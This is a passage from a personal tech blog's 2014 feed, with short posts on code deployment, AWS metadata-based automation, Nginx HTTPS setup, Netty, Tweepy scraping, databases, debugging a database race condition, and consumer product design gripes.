<p>We’re so used to spending that much on a coffee that we’ll pay it without question and we’re so convinced that ebooks should be less than $10 that we refuse to pay more. It’s amazing what habit and expectations can do. I understand this bias and yet I still have a hard time believing that by skipping two cups of coffee I can buy a book. It definitely makes me appreciate the effort required to change people’s perceptions of what’s a fair price.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Evolution of code deployment</title>
   <link href="http://dangoldin.com/2014/08/09/evolution-of-code-deployment/"/>
   <updated>2014-08-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/08/09/evolution-of-code-deployment</id>
   <content:encoded><![CDATA[
<p>I’ve been working on various tech related projects for over a decade now and have gone through a variety of approaches to deploying code. I’m far from an expert but though it would be helpful to jot down what I’ve seen and where I’m hoping to get.</p>

<ul>
  <li>
    <p>FTP upload, no version control: I developed my first few sites locally and then just copied them over to the host server via FTP. This worked well for simple projects where I was the only contributor.</p>
  </li>
  <li>
    <p>Version control, single branch: Once I discovered version control I immediately found it helpful. Version control made it easy to work with others but our deployment was still manual. When we were ready to deploy we would log in to our server, run the necessary commands to update the database schema, and then do pull/update to get a new version of our code base.</p>
  </li>
  <li>
    <p>Version control, single branch, more automated deployment: Logging in every time to do a deployment was a pain so we started using <a href="http://www.fabfile.org/" target="_blank">Fabric</a> to automate deployments. Fabric allowed us to execute scripts on multiple machines without having to manually log in to each one. Since each box had a set of roles we were able to set up Fabric to deploy by role (ie deploy this change to the DB server, deploy this change to all webservers).</p>
  </li>
  <li>
    <p>Version control, multiple branches, more automated deployment: Another improvement was following git best practices and setting up a production branch with everyone working on development branches that would then be merged into master. When the deployment was ready to go out it would be merged into production. The value here was that when we ran into a bug on production, we were able to fix it without having to merge in a bunch of new features.</p>
  </li>
  <li>
    <p>Version control, multiple branches, automated testing, automated deployment: This is the ideal state. Each of our repositories is tested enough that code changes are automatically tested, merged, and deployed to production. The process should also be smart enough to handle db migrations and would be to revert changes if any problems arise. In addition, each box may have a different set of required systems libraries and packages and an automated deployment should be able to automatically configure a server with the necessary packages. I know <a href="http://www.getchef.com/chef/" target="_blank">Chef</a> and <a href="http://puppetlabs.com/" target="_blank">Puppet</a> are used for this but I’m only exploring them now.</p>
  </li>
</ul>

<p>Something to add is that there’s a huge incentive to make your stack as stateless as possible - for example having multiple web servers behind a load balancer that don’t need to share any state with other webservers directly. This makes it simple to spin up new servers when there’s more demand and improves scalability. Unfortunately, it’s not always possible and complicated deployments end up having coupling - especially when high performance is required. In that case adopting a declarative approach when configuring your instances helps bring some sort of statelessness - for example using AWS tags to declare an instance to be of a particular type and using the region information to dictate what other instances it needs to connect to. Otherwise you’re stuck trying to define a complicated topology via config files. I’d love to know how massive companies manage their deployments - I know Facebook has a <a href="http://arstechnica.com/business/2012/04/exclusive-a-behind-the-scenes-look-at-facebook-release-engineering/" target="_blank">custom process</a> that will deploy new code to a set of boxes and then use BitTorrent to share it to others but I’d love to be able to compare that with those of others, for example Google and Amazon.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Getting the most out of Lyft's 50 free rides</title>
   <link href="http://dangoldin.com/2014/08/03/getting-the-most-out-of-lyfts-50-free-rides/"/>
   <updated>2014-08-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/08/03/getting-the-most-out-of-lyfts-50-free-rides</id>
   <content:encoded><![CDATA[
<p>In honor of their NYC launch, <a href="https://www.lyft.com/" target="_blank">Lyft</a> came up with an awesome promotion - 50 free rides, up to $25 each, over the next couple of weeks. This had the desired effect - a bunch of my friends are giving it a shot but since everyone else is doing the same it’s difficult to find an available car. And when you do get a car you end up paying the peak demand rate rate.</p>

<p>One way to get around this is to break down a long trip into a series of shorter trips. The driver will have to agree to this but they have an incentive to do so since they will not need to find another passenger and will earn a base fare every trip. A minor inefficiency is that the driver will need to stop to mark the trip as completed and confirm the next trip. It’s also easy to go over $25, especially in prime time, so you need to stop more frequently than you think you need to. If only Lyft or Uber showed the real time cost of a trip you’d be able to stop at the optimal times.</p>

<p>We used this approach yesterday when going from midtown Manhattan to Brighton Beach and were able to do it with 6 Lyft trips. The first two ended up going over the $25 rate so we became aggressive stoppers after that. The driver mentioned that a bunch of his passengers used the same approach to get free rides to Long Island and Connecticut. I’m just waiting for Lyft to plug this loophole - a simple way would be to not allow the same consecutive driver/passenger pair.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Hiring people on Odesk</title>
   <link href="http://dangoldin.com/2014/07/31/hiring-people-on-odesk/"/>
   <updated>2014-07-31T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/31/hiring-people-on-odesk</id>
   <content:encoded><![CDATA[
<p>While working on <a href="http://getpressi.com/" target="_blank">Pressi</a>, we found a niche selling “social media mashup pages” to colleges and small universities. Once we discovered it we needed a quick way to find these colleges and identify the contact details of their marketing or social media directors. Searching for this information was not the most efficient use of time for our small team so we went looking for other options.</p>

<p>Two options that stood out were <a href="https://www.mturk.com" target="_blank">Mechanical Turk</a> and <a href="https://www.odesk.com/" target="_blank">Odesk</a> but they were designed for quick and simple tasks. Using them for complex tasks would result in poor quality results. One advantage that Odesk had was that it allowed us to work with the same person for many tasks - something we couldn’t figure out how to do using Mechanical Turk. This allowed us to come up with a set of potential candidates based on their project interest and skillset. We gave each of them the same set of problems to do and compared the results. Using this approach we discovered someone who was the right balance of cost and quality and we ended up working with her over the next few months to compile this list.</p>

<p>There’s a lot of talent on platforms such as Odesk and Mechanical Turk but it’s not easy to find. A good approach is to develop a set of tasks that you’re looking for someone to do and use that as a proxy for an interview. Giving this set of tasks to a few dozen people will lead to a few that stand out and can hired on for longer term work.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Low quality? Start bundling!</title>
   <link href="http://dangoldin.com/2014/07/29/low-quality-start-bundling/"/>
   <updated>2014-07-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/29/low-quality-start-bundling</id>
   <content:encoded><![CDATA[
<p>In the quest to reduce the amount of stuff I own I’ve been going through various cabinets and boxes and trying to list everything on eBay. The most common items are old cables with no corresponding devices (or any ideas what these devices even are) and old DVDs.</p>

<p>Looking at the historic prices for these items doesn’t make me happy - a Lenovo laptop charger is less than $10 while a Raging Bull DVD is a couple of bucks. But this entire process got me thinking about bundling. Bundling makes sense when selling cheap products. It’s not worth the time to list these individually and it’s likely that there are only a few people interested in each item. Bundling them makes it more likely that various items will appeal to a variety of buyers and increase competition. The Lenovo adapter may appeal to one person while a Game Boy charger may appeal to another. By having them in the same lot they are competing against each other and are willing to bid higher to get what they want.</p>

<p>High quality items are competitive on their own. The sum of the individual sales will be greater than the value of the bundle. The intuition is that bundling premium items when buyers only want a single item will decrease buyers’ willingness to pay more for the extra items.</p>

<p>HBO’s the standard example - it has enough consumer demand that it can stay independent and charge a premium. Other channels need to bundle and subsidize each other. I suspect many would be more successful breaking out, such as ESPN, but they’re either stuck in contracts or fear change.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Ephemeral security questions</title>
   <link href="http://dangoldin.com/2014/07/27/ephemeral-security-questions/"/>
   <updated>2014-07-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/27/ephemeral-security-questions</id>
   <content:encoded><![CDATA[
<p>I thought I’ve seen every design anti-pattern out there but had the luck to run into a new one a couple of days ago. I was buying domains on <a href="http://neamcheap" target="_blank">Namecheap</a> and ended up going through checkout without verifying the payment details. Turns out that I had an old credit card on file which led to a declined payment. I was redirected to a page that told me to update my payment methods but instead of doing that I ended up hitting back and refreshed the page which triggered another failed charge attempt. One more and I’m locked out of my account.</p>

<p>Ironically, other than speaking to a rep the only way to unlock my account was by entering the last 4 digits of the credit card which I no longer have. It only took a few minutes to clear that up with the rep and it was basically my  fault but it’s still interesting to see security questions based on ephemeral information. Old accounts are likely to have outdated credit cards, phone numbers, and addresses. In those cases it’s too easy to get locked out and be stuck with having to speak to a service rep - and I suspect most companies won’t be as responsive as Namecheap.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>When one door closes, another door opens</title>
   <link href="http://dangoldin.com/2014/07/23/when-one-door-closes-another-door-opens/"/>
   <updated>2014-07-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/23/when-one-door-closes-another-door-opens</id>
   <content:encoded><![CDATA[
<ul class="thumbnails">
  <li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/cinnamonsnail.jpg" alt="Cinnamon snail food truck" width="1024" height="683" layout="responsive"/>
      <p>Source: <a href="http://ecovegangal.com/eat/restaurant-reviews/item/923-video-review-the-cinnamon-snail-organic-vegan-food-truck-in-nj" target="_blank">
        EcoVeganGal.com
      </a></p>
    </div>
  </li>
</ul>

<p>Food trucks have taken over every city I’ve been to. A decade ago the best you could find was a taco truck but now food trucks run the gamut from the simple taco up to experimental vegan. Priceonomics has a <a href="http://blog.priceonomics.com/post/45352687467/food-truck-economics" target="_blank">great piece</a> on the rise of the food truck as well as a fascinating look at the economics of the food truck industry. If you haven’t read it yet definitely check it out.</p>

<p>The summary is that the decline of the housing market in 2008 led to a drop in construction which caused many food trucks to sold at a discount. These food trucks were then bought by aspiring chefs who wanted a low risk way to start a restaurant. The cheap trucks gave chefs a way to experiment with varying cuisines and locations without incurring the massive costs of starting a restaurant.</p>

<p>This is a perfect example of how capitalism should work. Industries that are no longer profitable make way for new ones that leverage existing infrastructure. In the future these food trucks will transform into miniature carriers that will carry drones that will deliver food throughout cities. When one door closes, another door opens.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A simple way to automate AWS deployments</title>
   <link href="http://dangoldin.com/2014/07/16/a-simple-way-to-automate-aws-deployments/"/>
   <updated>2014-07-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/16/a-simple-way-to-automate-aws-deployments</id>
   <content:encoded><![CDATA[
<p>A little known feature in AWS is an endpoint that allows you to retrieve various information about about the requesting instance. If you log in to one of your EC2 instance and make a simple request to http://169.254.169.254/latest/meta-data/instance-id you will get back the id of that instance. Similarly, you can get all sorts of <a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AESDG-chapter-instancedata.html" target="_blank">other instance information</a>, including the public hostname, the instance region, and instance type.</p>

<p>This can be useful when you want to automate a simple deployment where you have a few instance with a variety of roles. A lightweight approach would be to use the <a href="https://aws.amazon.com/cli/" target="_blank">AWS CLI</a> to retrieve a list of all running instances along with their tag names, make a request to the meta-data/instance-id endpoint to get the id of the current instance, and then look up that id in the instance list in order to figure out what the role of this instance should be. Then execute the appropriate set of scripts to configure the instance properly.</p>

<p>More advanced solutions would involve using <a href="http://www.getchef.com/chef/" target="_blank">Chef</a>, <a href="http://puppetlabs.com/" target="_blank">Puppet</a>, or <a href="https://aws.amazon.com/opsworks/" target="_blank">Opswork</a> but they come with a steep learning curve and overkill for a simple application. If it turns out your application is growing you can always upgrade to a more robust deployment solution.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Set up HTTPS on EC2 running Nginx without ELB</title>
   <link href="http://dangoldin.com/2014/07/15/set-up-https-on-ec2-running-nginx-without-elb/"/>
   <updated>2014-07-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/15/set-up-https-on-ec2-running-nginx-without-elb</id>
   <content:encoded><![CDATA[
<p>I recently needed to set up HTTPS for my side project, <a href="https://better404.com/" target="_blank">better404.com</a>. Amazon makes it easy to <a href="http://docs.aws.amazon.com/ElasticLoadBalancing/latest/DeveloperGuide/US_UpdatingLoadBalancerSSL.html" target="_blank">set up</a> by uploading it directly to an ELB but in my case it’s hosted on a single AWS instance so I didn’t want to pay for an ELB that would be more expensive than my one instance. I’ve heard horror stories and expected the worst but it turned out surprisingly easy. Hopefully these steps can help someone else out.</p>

<ul>
  <li>Get an HTTPS certificate. I bought three certificates from Namecheap a couple of months ago when they were running a  promotion.</li>
  <li>Go through the certificate generation process. I found <a href="http://kbeezie.com/free-ssl-with-nginx/" target="_blank">this guide</a> that explains how to do it detail and worked well for me. The only things I had to change where the  Nginx certificate configuration folder path (/opt/local/nginx/conf/certs =&gt; /etc/nginx/certs/) and replacing the filenames to be more specific (domain.* to better404.*). Note that this process is not immediate and you will need to send the contents of your CSR file to the SSL provider and they will respond back with the SSL certificate to use.</li>
  <li>Enable SSL in Nginx. The previous guide provides some information here and I’m including the relevant parts from my configuration. I chose to redirect all traffic to HTTPS rather than supporting both simultaneously.

<figure class="highlight"><pre><code class="language-nginx" data-lang="nginx"><span class="c1">#Nginx config</span>
<span class="k">server</span> <span class="p">{</span>
    <span class="kn">listen</span> <span class="s">*:80</span><span class="p">;</span>
    <span class="kn">server_name</span> <span class="s">www.better404.com</span><span class="p">;</span>
    <span class="kn">rewrite</span>        <span class="s">^</span> <span class="s">https://</span><span class="nv">$server_name$request_uri</span><span class="s">?</span> <span class="s">permanent</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">server</span> <span class="p">{</span>
    <span class="kn">listen</span> <span class="s">*:80</span><span class="p">;</span>
    <span class="kn">server_name</span> <span class="s">better404.com</span><span class="p">;</span>
    <span class="kn">rewrite</span>        <span class="s">^</span> <span class="s">https://</span><span class="nv">$server_name$request_uri</span><span class="s">?</span> <span class="s">permanent</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">server</span> <span class="p">{</span>
    <span class="kn">listen</span> <span class="s">*:443</span> <span class="s">ssl</span><span class="p">;</span>
    <span class="kn">server_name</span> <span class="s">better404.com</span><span class="p">;</span>

    <span class="kn">ssl</span> <span class="no">on</span><span class="p">;</span>
    <span class="kn">ssl_certificate</span> <span class="nc">certs/better</span><span class="mi">404</span><span class="s">.pem</span><span class="p">;</span>
    <span class="kn">ssl_certificate_key</span> <span class="nc">certs/better</span><span class="mi">404</span><span class="s">.key</span><span class="p">;</span></code></pre></figure>
</li>
  <li>Allow Nginx to bind to the IP address. One thing that’s not mentioned in the guide and required a bit of digging around is that you need to allow Nginx to bind to the non local IP address - otherwise it can only access the private IP address set by AWS. There’s a <a href="http://stackoverflow.com/a/13141104/1139968" target="_blank">quick guide</a> on how to do this I found on StackOverflow.</li>
</ul>

<p>If you have any questions feel free to leave a comment and I’ll try to help out.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Getting low level with HTTP</title>
   <link href="http://dangoldin.com/2014/07/14/getting-low-level-with-http/"/>
   <updated>2014-07-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/14/getting-low-level-with-http</id>
   <content:encoded><![CDATA[
<p>I’m currently working on an application using <a href="http://netty.io/" target="_blank">Netty</a>, a low level network framework, and it’s given me a wonderful education of the HTTP protocol. Prior to this project, every web application I’ve worked on has leveraged a framework that removed the low level details. They built the HTTP requests from multiple packets, took care of various encoding issues, dealt with keep-alive connections, came with built-in support for sessions and cookies, and in general made it extremely easy to get a web server up and running.</p>

<p>Writing a Netty application is completely different than using a framework such as Django, Ruby on Rails, or Node. You get a much better understanding of how TCP and HTTP work and doesn’t actually take that much time once you get the hang of it. Building an HTTP request from individuals packets was completely novel and finally getting it to work made me feel the same way as when I built my first site. If you’re interested in or currently working in web development and you haven’t worked with a low level framework, take a weekend off and give it a try - it’ll give you a newfound appreciation of how the modern web works.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Good artists use fewer tools</title>
   <link href="http://dangoldin.com/2014/07/13/good-artists-use-fewer-tools/"/>
   <updated>2014-07-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/13/good-artists-use-fewer-tools</id>
   <content:encoded><![CDATA[
<blockquote>Actually, as the artist gets more into his thing, and as he gets more successful, his number of tools tends to go down. He knows what works for him. Expending mental energy on stuff wastes time.<br />
&nbsp;&nbsp;- Hugh MacLeod, <a href="http://gapingvoid.com/ie/" target="_blank">Ignore Everybody</a>
</blockquote>

<p>This quote refers to art but it can just as easily apply to code. As developers, we’re constantly exposed to new tools and technologies and are curious to try them out. Everything new looks shiny and we imagine it will solve all the problems we’re facing. Yet almost always new tools bring their own set of problems and take time to learn. Instead of constantly chasing something new we should try to master what we’re already using - the value of that will most likely outweigh playing with a new toy. It’s better to rely on a small set of tools that we understand well rather than have a superficial knowledge of dozens of tools and technologies.</p>

<p>Of course it’s important to try out new tools since many of them are useful but it’s dangerous to rely on new tools exclusively and use them for a new project just because they’re the next big thing. To get some exposure to new tools, I will use them in toy projects or during hackathons so I can get a sense of how they work, what the strengths and weaknesses are, and how much I enjoy using them. Only then will I consider using them in a real project.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Amazon courting app developers for the Fire phone</title>
   <link href="http://dangoldin.com/2014/07/10/amazon-courting-app-developers-for-the-fire-phone/"/>
   <updated>2014-07-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/10/amazon-courting-app-developers-for-the-fire-phone</id>
   <content:encoded><![CDATA[
<p>I’m a bit late to the Amazon Fire Phone party but wanted to chime in with a perspective I haven’t seen written about. Amazon is offering a <a href="https://developer.amazon.com/public/community/post/TxA5PWCC1V2HCT/Limited-Time-Offer-Earn-a-Guaranteed-6-CPM-on-Interstitial-Ads-from-the-Amazon-M" target="_blank">$6 CPM to mobile app developers</a> that launch an Amazon app during Auguster and September. Given that typical CPMs are <a href="http://www.slideshare.net/augustinefou/digital-advertising-benchmarks-2014-by-augustine-fou" target="_blank">less than a dollar</a> with premium publishers like Facebook and Twitter getting <a href="http://www.nanigans.com/2014/02/05/q4-facebook-global-advertising-trends-biggest-quarter-ever-for-paid-facebook-advertising-in-q4-2013/" target="_blank">close to $6</a>, this is a very aggressive move by Amazon to build out their ecosystem.</p>

<p>A common refrain mentioned is that ecosystems drive smartphone adoption. This is why it’s extremely difficult to compete against iOS and Android which combined have <a href="http://www.businessinsider.com/android-v-apple-ios-market-share-revenue-income-2014-6" target="_blank">72% share</a> of the smartphone market. Amazon is trying to jumpstart this by offering a potentially huge sum to developers if they’re able to get the users. Amazon will have a difficult time getting a large market share but I suspect they will find a niche in a particular customer segment and a few app developers will be rewarded.</p>

<p>It’s also interesting to contrast this with Microsoft’s approach of paying developers a flat sum to create a Windows phone version of their app. On one hand, this approach allows Microsoft to be selective since they can pay to get the apps they want. On the other hand they run the risk of paying for an app without any users. The interests between Microsoft and it’s app developers are not as aligned as those between Amazon and it’s app developers.</p>

<p>One thing that may have influenced this decision is that Amazon’s OS is Android based so it’s significantly less work to port an app to work on Amazon’s phone compared to a Windows Phone. The pitch to developers is akin to saying make a few changes to your app and potentially earn a bunch of money while Microsoft’s would be write a new app in a new language and we’ll pay you for your efforts.</p>

<p>Almost all Amazon phone coverage has been bearish and I wonder whether this move will have an impact. Apps to drive smartphone adoption but with so many good options already available replicating an ecosystem won’t be enough.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>On Google Now</title>
   <link href="http://dangoldin.com/2014/07/09/on-google-now/"/>
   <updated>2014-07-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/09/on-google-now</id>
   <content:encoded><![CDATA[
<p>As much as it pains me to admit it I’m really enjoying Google Now. I’m aware of how much information I’m sharing with Google to make it helpful but at the moment I find the tradeoff worth it.</p>

<p>It came in especially useful as I’ve been traveling over the past couple of weeks:</p>

<ul>
  <li>Show the official exchange rate when traveling. This may not be perfect, especially in the case of “blue markets,” but it’s nice having a rough idea of how much a US dollar is worth.</li>
  <li>Flight information. Since my flight details get sent to my Gmail account, I can quickly tell whether my flight’s delayed and what terminal and gate it’s scheduled to depart from and arrive to. This is useful to have when I need to make a transfer since I can quickly see where my next flight departs from.</li>
  <li>Flight boarding passes. In addition to the flight information Google Now also shows the boarding passes for my checked in flights. I didn’t have to do anything to board a plane other than activate my home screen and place it against a scanner.</li>
  <li>Hotel information. Similar to flight information, I get a card telling me where my hotel is and how to get there.</li>
  <li>Google calendar integration. This is an obvious one but I run my life through Google calendar. This gives me constant notifications of what I have to do when and as long as I enter an address for my events I also get an estimate for when I should leave.</li>
</ul>

<p>A concern is that to actually make it useful I have to integrate more and more of my world with Google and I expect this to get worse as more Google Now cards are developed. The optimist in me hopes that Google Now will be opened up to third party developers in a future version of Android but the cynic suspects it’s not going to happen.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Retrieving a Twitter user's followers and followees</title>
   <link href="http://dangoldin.com/2014/07/07/retrieving-a-twitter-users-followers-and-followees/"/>
   <updated>2014-07-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/07/retrieving-a-twitter-users-followers-and-followees</id>
   <content:encoded><![CDATA[
<p>After reading Gilad Lotan’s <a href="https://medium.com/i-data/fake-friends-with-real-benefits-eec8c4693bd3" target="_blank">post</a> where Gilad bought 4,000 Twitter followers in order to analyze them, a <a href="https://twitter.com/geoffgolberg" target="_blank">friend</a> of mine was inspired to analyze his followers to see if he could get any insight and come up with a neat visualization. The first step was downloading a dataset containing his followers and followees as well as the followers and followees for each of those accounts - the idea being that by going two levels deep you see how similar the various accounts are to each other based on who and what they follow and whether there are any patterns.</p>

<p>I offered to write a short script to help him pull the data and it turned out to be easier than I thought due to the excellent <a href="http://www.tweepy.org/" target="_blank">Tweepy library</a>. The biggest challenge was figuring out how to use Tweepy to deal with Twitter’s absurdly strict API limit (15 requests per 15 minutes) since the documentation was a bit sparse but after discovering the Cursor object it became surprisingly easy to iterate through the results and wait for 15 minutes for API errors.</p>

<p>The code currently works in a user id rather than username world since I wanted to avoid making additional calls but that can be implemented in the end to just pull the usernames for every user id in the dataset. The <a href="https://github.com/dangoldin/twitter-friend-follower-pull" target="_blank">code’s</a> up on Github so feel free to try it out and let me know if you run into any issues.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The future of databases</title>
   <link href="http://dangoldin.com/2014/07/05/the-future-of-databases/"/>
   <updated>2014-07-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/07/05/the-future-of-databases</id>
   <content:encoded><![CDATA[
<p>A couple of weeks ago I attended a talk by <a href="https://en.wikipedia.org/wiki/Michael_Stonebraker" target="_blank">Professor Michael Stonebraker</a>. For those unfamiliar with him, he’s a database researcher responsible for PostgreSQL, Vertica, VoltDB and a dozen others. During his talk he shared his thoughts about the future of databases and what we can expect to see in the coming years. His main point is that databases are becoming more and more specialized and it will be very common for companies to run multiple types of databases that are optimized for different uses cases.</p>

<p>This is already happening at the larger tech companies and it’s spreading downwards. Data is becoming increasingly important and having the tools available to leverage it is a critical advantage. It’s impossible to find a single database that can be used to run a transactional site, support complex yet quick analytics queries, scale to terabytes of data, and still maintain synchronization between its various nodes. Each of these use cases requires a database that’s optimized for that need and an application that knows how to leverage that database.</p>

<p>The neat thing is that many of these newer databases have embraced a SQL-like query syntax so it’s surprisingly easy to get started. The challenge is that this similarity is only skin deep and the implementations are drastically differently both in terms of how the data is stored as well as how the queries are executed. So although it’s simple to write a query that will execute on both Redshift and PostgreSQL it’s likely that this query isn’t as efficient as it can be on one or both of the databases.</p>

<p>This is the right approach for the specialized-database future. By providing a standard interface it makes us more comfortable with introducing a new database into our stack while providing very different functionality under the surface. It’s likely that the first implementations won’t be ideal but as teams become more comfortable with these new systems the implementations will evolve. I hope this pattern of standardizing around a simple interface becomes more popular. Then the backend can be designed for a variety of use cases without forcing the users to completely change the way they think.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>On having my Pinterest account hacked</title>
   <link href="http://dangoldin.com/2014/06/15/on-having-my-pinterest-account-hacked/"/>
   <updated>2014-06-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/06/15/on-having-my-pinterest-account-hacked</id>
   <content:encoded><![CDATA[
<p>Earlier today a I got a message on Twitter letting know that my Twitter account was hacked. Sure enough when I looked at my tweet history I saw a slew of weight loss tweets linking to a Pinterest pin. Turns out that my Pinterest account was compromised and since it was connected to Twitter every time someone pinned a weight loss link it got shared on Twitter.</p>

<p>The fix was simple - block the Pinterest app from within Twitter, disconnect Twitter from within Pinterest, and reset my Pinterest password. Unfortunately, none of these can be done via the apps nor the mobile sites. Instead, both provide a minimal settings page with no clear way of accessing the complete settings. Since I wasn’t near a computer, I had to use the Twitter app to delete the spam tweets that were being posted a few times each hour.</p>

<p>This is a frustrating design pattern. Sites and apps should default to a mobile optimized experience but if any functionality is missing they should allow users to fall back to the web view. Arguably, that option should always be available since a user may have a specific flow in mind and shouldn’t be forced to learn a new approach - especially if something’s urgent. In my case, this wasn’t that huge of a deal but I can see how it could have been.</p>

<p>The other lesson is that in this world of interconnected apps you’re only as strong as the weakest app. Twitter followers don’t care why they’re seeing spam and having TFA enabled on Twitter won’t help you if another account is compromised.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>An eBay design rant: timezone support</title>
   <link href="http://dangoldin.com/2014/06/12/an-ebay-design-rant-timezone-support/"/>
   <updated>2014-06-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/06/12/an-ebay-design-rant-timezone-support</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/ebay-start-time.png" alt="eBay start time" width="556" height="93" layout="responsive"/>

<p>I recently needed to sell something on eBay and encountered an issue I thought they would have taken care of by now. Apparently you can pick the start time for an auction but it has to be in PDT - there’s no way to choose another time zone. The change is trivial and one would think that a $60B company would be able to support multiple time zones in their core product. Someone brought this up in <a href="http://community.ebay.com/t5/My-eBay/HOW-DO-I-CHANGE-THE-TIMEZONE/td-p/2675835" target="_blank">the forums</a> in 2012 and it turns out that time zone support is only present in the forum to allow users to see posts with a local time.</p>

<p>Whenever I see seemingly obvious UX anti-patterns it makes me think there must have been an ulterior motive. In this case, I suspect not having a time zone may lead to a smoother distribution of auction end times which keeps product demand high and can distributes bids more evenly throughout the day. Another reason may be the desire to reduce risk - time zones are difficult to get right and it’s possible that eBay doesn’t want to expose themselves to the liability. The most likely reason may be that they are just not investing heavily in the use experience. They’re already the market leaders and it may make more sense to focus on marketing and selling rather than on making it easy to list a product. If someone’s already started to list a product it’s unlikely that the lack of a timezone will cause him to change his mind - it didn’t in my case.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Replacing Evernote</title>
   <link href="http://dangoldin.com/2014/06/08/replacing-evernote/"/>
   <updated>2014-06-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/06/08/replacing-evernote</id>
   <content:encoded><![CDATA[
<p>Although there’s been a ton of services launching trying to help people do everything under the sun I’ve been finding myself going back to simple tools. One of these has been replacing Evernote with text files that are synced via Dropbox after getting annoyed with Evernote one too many times. It’s great, I edit files in <a href="http://www.sublimetext.com/" target="_blank">Sublime Text</a> and came up with my own naming format to make search easier. If that fails, I just use grep and find and almost always find what I’m looking for. Since the files are plain text, every Linux command is a tool. It’s trivial to do bulk search/replace using sed or compose one liners to do various filters and counts. It’s easy to sort files by time or size and being able to do a regex search comes in handy when you only have a vague idea of what words you used when writing a note.</p>

<p>I wish more services would approach their products the same way - only focus on one thing, do it well, and allow other services to integrate with it in a simple way. This belief has been the foundation of the <a href="https://en.wikipedia.org/wiki/Unix_philosophy" target="_blank">Unix philosophy</a> but sadly most businesses haven’t embraced it due to a desire to encourage lock in and increase switching costs. Hopefully this changes in the future.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Debugging a reverting database update</title>
   <link href="http://dangoldin.com/2014/06/07/debugging-a-reverting-database-update/"/>
   <updated>2014-06-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/06/07/debugging-a-reverting-database-update</id>
   <content:encoded><![CDATA[
<p>I ran into an odd bug today where a database entry was reverting itself after a seemingly simple update. For <a href="http://better404.com">Better404</a>, a customer can change the design of their 404 page but it turns out that every once in a while a change would go through but within a minute would revert back to the previous value. At the same time, update queries run directly via the MySQL client ran fine and were not being reverted - just the ones made through the site. To see what was going on, I enabled full query logging in MySQL (SET GLOBAL general_log = ‘ON’) and sure enough I saw a lagging query that would update the record to the prior values. Stepping through the code I was able to figure out the cause.</p>

<p>As with most <a href="https://en.wikipedia.org/wiki/Heisenbug" target="_blank">Heisenbugs</a>, it turned out to be a timing/concurrency issue. As part of a user updating their settings, we would kick off a job to crawl and index the modified domain. After running, the job would update the record with the newly crawled timestamp. Unfortunately, the other fields were updated as well and since this indexing job was kicked off before the record was updated, stale data was written to the database. After figuring out the cause, the fix is easy. One option is to kick off the indexing job after the database is updated with the new values so that the indexing job will use the new values. The second option is to modify the indexing job to only update the relevant fields. Both options were trivial to implement so I played it safe and did both. The first required changing the order of some lines and the second was just specifying an optional parameter to the Django model’s save method. Below’s a visual representation of what was happening and the two fixes.</p>

<img src="http://dangoldin.com/assets/static/images/debugging-reverting-db-update.png" alt="Debugging a reverting database update" width="968" height="511" layout="responsive"/>

<p>Unfortunately, concurrency and timing bugs tend to be the most difficult ones to figure out but whenever there’s non deterministic behavior they should be at the top of the suspect list. It’s important to know the tools we’re using and their default behavior - it’s possible that the approach they take differs from how we think they work and becomes a major source of bugs and frustrated debugging efforts.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Approachable data science</title>
   <link href="http://dangoldin.com/2014/06/02/approachable-data-science/"/>
   <updated>2014-06-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/06/02/approachable-data-science</id>
   <content:encoded><![CDATA[
<p>Data science has earned the reputation of being complicated and inaccessible to those without an advanced degree but it doesn’t have to be this way. The goal of data science is simply to unlock insights and value from data. There’s no need to make it more complicated than that. Of course, there are times where the data requires some domain knowledge or is just too big for someone without the necessary experience to work with but I believe that most places have enough low hanging fruit that anyone who can write a quick script can contribute and do data science.</p>

